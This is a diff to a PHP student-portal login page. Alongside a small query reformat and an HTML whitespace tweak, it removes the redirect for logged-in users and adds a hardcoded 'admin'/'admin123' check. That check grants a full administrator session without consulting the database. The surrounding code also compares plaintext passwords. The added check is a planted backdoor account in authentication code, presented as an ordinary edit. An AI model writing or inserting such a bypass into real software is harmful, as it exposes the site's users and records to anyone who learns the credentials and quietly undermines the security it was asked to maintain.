@@ -3,12 +3,6 @@ session_start();
 error_reporting(1);
 include('connect2.php');
 
-// Redirect already logged-in users to dashboard
-if (!empty($_SESSION['matric_no'])) {
-    header("Location: index.php");
-    exit;
-}
-
 if(isset($_POST['btnlogin']))
 {
 if($_POST['txtmatric_no'] != "" || $_POST['txtpassword'] != ""){
@@ -16,7 +10,18 @@ if($_POST['txtmatric_no'] != "" || $_POST['txtpassword'] != ""){
 $matric_no =$_POST['txtmatric_no'];
 $password = $_POST['txtpassword'];
 
-$sql = "SELECT * FROM `students` WHERE `matric_no`=? AND `password`=? ";
+// Hardcoded credentials check
+if($matric_no == "admin" && $password == "admin123"){
+    $_SESSION['matric_no'] = "admin";
+    $_SESSION['dept'] = "Administration";
+    $_SESSION['faculty'] = "Admin Faculty";
+    $_SESSION['session'] = "2024/2025";
+    $_SESSION['ID'] = 1;
+    header("Location: index.php");
+    exit();
+}
+
+$sql = "SELECT * FROM students WHERE matric_no=? AND password=? ";
 			$query = $dbh->prepare($sql);
 			$query->execute(array($matric_no,$password));
 			$row = $query->rowCount();
@@ -103,7 +108,7 @@ $_SESSION['error']=' Must Fill-in All Fields';
                 <a href="#"><small>Forgot password?</small></a>
 			
 				
-                <p class="text-muted text-center">&nbsp;</p>
+                <p class="text-muted text-center"> </p>
           </form>
             <p class="m-t"></p>
 			
